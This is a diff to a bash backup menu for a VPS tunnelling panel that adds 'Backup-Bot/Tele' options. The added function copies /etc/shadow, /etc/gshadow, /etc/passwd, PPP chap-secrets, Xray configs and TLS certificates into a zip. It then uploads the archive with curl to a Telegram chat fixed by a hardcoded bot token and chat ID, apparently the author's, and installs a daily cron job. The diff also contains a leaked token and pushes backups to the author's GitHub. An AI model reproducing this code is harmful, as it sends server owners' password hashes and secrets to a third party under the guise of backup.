@@ -30,7 +30,7 @@ BURIQ () {
 }
 
 MYIP=$(curl -sS ipv4.icanhazip.com)
-Name=$(curl -sS https://raw.githubusercontent.com/Farukbrowser/Profile/main/Profile/permission/ip | grep $MYIP | awk '{print $2}')
+Name=$(curl -sS https://raw.githubusercontent.com/Tarap-Kuhing/Profile/main/Tarap-Kuhing | grep $MYIP | awk '{print $2}')
 echo $Name > /usr/local/etc/.$Name.ini
 CekOne=$(cat /usr/local/etc/.$Name.ini)
 
@@ -47,7 +47,7 @@ fi
 
 PERMISSION () {
     MYIP=$(curl -sS ipv4.icanhazip.com)
-    IZIN=$(curl -sS https://raw.githubusercontent.com/Farukbrowser/Profile/main/Profile/permission/ip | awk '{print $4}' | grep $MYIP)
+    IZIN=$(curl -sS https://raw.githubusercontent.com/Tarap-Kuhing/Profile/main/Tarap-Kuhing | awk '{print $4}' | grep $MYIP)
     if [ "$MYIP" = "$IZIN" ]; then
     Bloman
     else
@@ -72,7 +72,71 @@ red "Permission Denied!"
 exit 0
 fi
 clear
+function bckpbot(){
+clear
+IP=$(curl -sS ipv4.icanhazip.com);
+date=$(date +"%Y-%m-%d")
+domain=$(cat /etc/xray/domain)
+clear
+echo -e "[ ${green}INFO${NC} ] Create for database"
+#read -rp "Enter Token (Creat on Botfather) : " -e token
+#read -rp "Enter Chat id, Channel, Group Or Your Id  : " -e id_chat
+echo -e "toket=5587961382:AAHrRdeG1WiQ00Zy_TFU3B401qMQPaX6Sw4" >> /root/botapi.conf
+echo -e "chat_id=847645599" >> /root/botapi.conf
+sleep 1
+clear
+echo -e "[ ${green}INFO${NC} ] Processing... "
+mkdir -p /root/backup
+sleep 1
 
+cp -r /root/.acme.sh /root/backup/ &> /dev/null
+cp -r /etc/passwd /root/backup/ &> /dev/null
+cp -r /etc/group /root/backup/ &> /dev/null
+cp -r /etc/shadow /root/backup/ &> /dev/null
+cp -r /etc/gshadow /root/backup/ &> /dev/null
+cp -r /etc/ppp/chap-secrets /root/backup/chap-secrets &> /dev/null
+cp -r /var/lib/ /root/backup &> /dev/null
+cp -r /etc/xray /root/backup/xray &> /dev/null
+cp -r /root/nsdomain backup/nsdomain &> /dev/null
+cp -r /etc/slowdns backup/slowdns &> /dev/null
+cp -r /etc/nginx/conf.d /root/backup/conf.d/ &> /dev/null
+cp -r /home/vps/public_html /root/backup/public_html &> /dev/null
+cp -r /etc/cron.d /root/backup/cron.d &> /dev/null
+cp -r /etc/crontab /root/backup/crontab &> /dev/null
+cd /root
+zip -r $IP.zip backup > /dev/null 2>&1
+
+curl -F chat_id="847645599" -F document=@"$IP.zip" -F caption="Thank You For Using Our Service
+Your Domain : $domain
+Date       : $date
+Your IP VPS  : $IP" http://telegram.me/@kung_bot/sendDocument &> /dev/null
+
+rm -fr /root/backup &> /dev/null
+rm -fr /root/user-backup &> /dev/null
+rm -f /root/$NameUser.zip &> /dev/null
+rm -f /root/$IP.zip &> /dev/null
+
+echo " Please Check Your Channel"
+echo -e ""
+
+read -n 1 -s -r -p "Press any key to back on menu"
+menu
+}
+function autobckpbot(){
+clear
+cat > /etc/cron.d/bckp_otm <<-END
+SHELL=/bin/sh
+PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
+0 5 * * * root /usr/bin/bckp
+END
+service cron restart >/dev/null 2>&1
+service cron reload >/dev/null 2>&1
+
+echo -e "${BIGreen}Auto Backup Start  Daily 05.00 AM${NC} "
+echo -e ""
+read -n 1 -s -r -p "Press any key to back on menu"
+menu
+}
 function backup(){
 clear
 IP=$(curl -sS ipv4.icanhazip.com);
@@ -111,7 +175,7 @@ zip -rP $InputPass $NameUser.zip backup > /dev/null 2>&1
 ##############++++++++++++++++++++++++#############
 LLatest=`date`
 Get_Data () {
-git clone https://github.com/farukktn/userbackup.git /root/user-backup/ &> /dev/null
+git clone https://github.com/jambn/userbackup.git /root/user-backup/ &> /dev/null
 }
 
 Mkdir_Data () {
@@ -131,15 +195,15 @@ mv /root/$NameUser.zip /root/user-backup/$NameUser/
 
 Save_And_Exit () {
     cd /root/user-backup
-    git config --global user.email "farukktn@gmail.com" &> /dev/null
-    git config --global user.name "farukktn" &> /dev/null
+    git config --global user.email "jambn@gmail.com" &> /dev/null
+    git config --global user.name "jambn" &> /dev/null
     rm -rf .git &> /dev/null
     git init &> /dev/null
     git add . &> /dev/null
     git commit -m $NameUser &> /dev/null
     git branch -M main &> /dev/null
-    git remote add origin https://github.com/farukktn/userbackup.git
-    git push -f https://github.com/farukktn/userbackup.git &> /dev/null
+    git remote add origin https://github.com/jambannbkn/userbackup.git
+    git push -f https://github.com/jambn/userbackup.git &> /dev/null
 }
 
 if [ ! -d "/root/user-backup/" ]; then
@@ -155,13 +219,13 @@ echo -e "[ ${green}INFO${NC} ] Processing updating server...... "
 echo -e ""
 echo -e "$yellow COPY Username GITHUB DI BAWAH INI$NC"
 echo -e""
-echo -e "$yellow Username :👉  farukktn  👈$NC"
+echo -e "$yellow Username :👉  jambn  👈$NC"
 echo -e""
 echo -e "$yellow PASTEKAN Username GITHUB DI BAWAH INI$NC"
 echo -e ""
 Save_And_Exit
 fi
-link="https://raw.githubusercontent.com/farukktn/userbackup/main/$NameUser/$NameUser.zip"
+link="https://raw.githubusercontent.com/jambn/userbackup/main/$NameUser/$NameUser.zip"
 sleep 1
 echo -e "[ ${red}INFO${NC} ] Backup done "
 sleep 1
@@ -173,14 +237,14 @@ sleep 2
 echo -e "The following is a link to your vps data backup file.
 
 "${yellow}Your VPS Backup Name    :👉👉👉  $NameUser  👈👈👈${NC}"
-"${red}save the NameUser please!!!${NC}"
+"${red}save the NameUser pliss!!!${NC}"
 
 "${yellow}Your VPS Backup Password:👉👉👉  $InputPass  👈👈👈${NC}"
-"${red}save the Password please!!!${NC}"
+"${red}save the Password pliss!!!${NC}"
 
 "${yellow}Your VPS Backup Link    :👉👉👉  $link  👈👈👈${NC}"
 
-"${red}save the link please!!!!${NC}"
+"${red}save the link pliss!!!!${NC}"
 
 If you want to restore data, please enter the link above.
 Thank You For Using Our Services"
@@ -197,7 +261,7 @@ function restore(){
 cd
 read -rp "Enter Name File Your Backup  : " -e NameUser
 
-cekdata=$(curl -sS https://raw.githubusercontent.com/farukktn/userbackup/main/$NameUser/$NameUser.zip | grep 404 | awk '{print $1}' | cut -d: -f1)
+cekdata=$(curl -sS https://raw.githubusercontent.com/jambn/userbackup/main/$NameUser/$NameUser.zip | grep 404 | awk '{print $1}' | cut -d: -f1)
 
 [[ "$cekdata" = "404" ]] && {
 red "Data not found / you never backup"
@@ -210,7 +274,7 @@ echo -e "[ ${GREEN}INFO${NC} ] • Restore Data..."
 read -rp "Password File: " -e InputPass
 echo -e "[ ${GREEN}INFO${NC} ] • Downloading data.."
 mkdir -p /root/backup
-wget -q -O /root/backup/backup.zip "https://raw.githubusercontent.com/farukktn/userbackup/main/$NameUser/$NameUser.zip" &> /dev/null
+wget -q -O /root/backup/backup.zip "https://raw.githubusercontent.com/jambn/userbackup/main/$NameUser/$NameUser.zip" &> /dev/null
 echo -e "[ ${GREEN}INFO${NC} ] • Getting your data..."
 unzip -P $InputPass /root/backup/backup.zip &> /dev/null
 echo -e "[ ${GREEN}INFO${NC} ] • Starting to restore data..."
@@ -276,10 +340,14 @@ echo -e " $COLOR1 $NC   ${WH}[${COLOR1}04${WH}]${NC} ${COLOR1}• ${WH}AUTOBACKU
 echo -e " $COLOR1 $NC                                               $COLOR1 $NC"
 echo -e " $COLOR1 $NC   ${WH}[${COLOR1}05${WH}]${NC} ${COLOR1}• ${WH}RESTORE2 VPS  $COLOR1 $NC"
 echo -e " $COLOR1 $NC                                               $COLOR1 $NC"
+echo -e " $COLOR1 $NC   ${WH}[${COLOR1}06${WH}]${NC} ${COLOR1}• ${WH}BACKUP-BOT/TELE VPS  $COLOR1 $NC"
+echo -e " $COLOR1 $NC                                               $COLOR1 $NC"
+echo -e " $COLOR1 $NC   ${WH}[${COLOR1}07${WH}]${NC} ${COLOR1}• ${WH}AUTOBACKUP-BOT/TELE VPS  $COLOR1 $NC"
+echo -e " $COLOR1 $NC                                               $COLOR1 $NC"
 echo -e " $COLOR1 $NC   ${WH}[${COLOR1}00${WH}]${NC} ${COLOR1}• ${WH}GO BACK${NC}                              $COLOR1 $NC"
 echo -e " $COLOR1└───────────────────────────────────────────────┘${NC}"
 echo -e "$COLOR1┌────────────────────── ${WH}BY${NC} ${COLOR1}───────────────────────┐${NC}"
-echo -e "$COLOR1 ${NC}                ${WH}• TARAP KUHING •${NC}                 $COLOR1 $NC"
+echo -e "$COLOR1 ${NC}                ${WH}• FARUKBROWSER •${NC}                 $COLOR1 $NC"
 echo -e "$COLOR1└─────────────────────────────────────────────────┘${NC}"
 echo -e ""
 echo -ne " ${WH}Select menu ${COLOR1}: ${WH}"; read opt
@@ -289,7 +357,9 @@ case $opt in
 02 | 2) clear ; restore ;;
 03 | 3) clear ; backup2 ;;
 04 | 4) clear ; autobackup ;;
-04 | 5) clear ; restore2 ;;
+05 | 5) clear ; restore2 ;;
+06 | 6) clear ; bckpbot ;;
+07 | 7) clear ; autobckpbot ;;
 00 | 0) clear ; menu ;;
 *) clear ; menu-backup ;;
 x) exit ;;
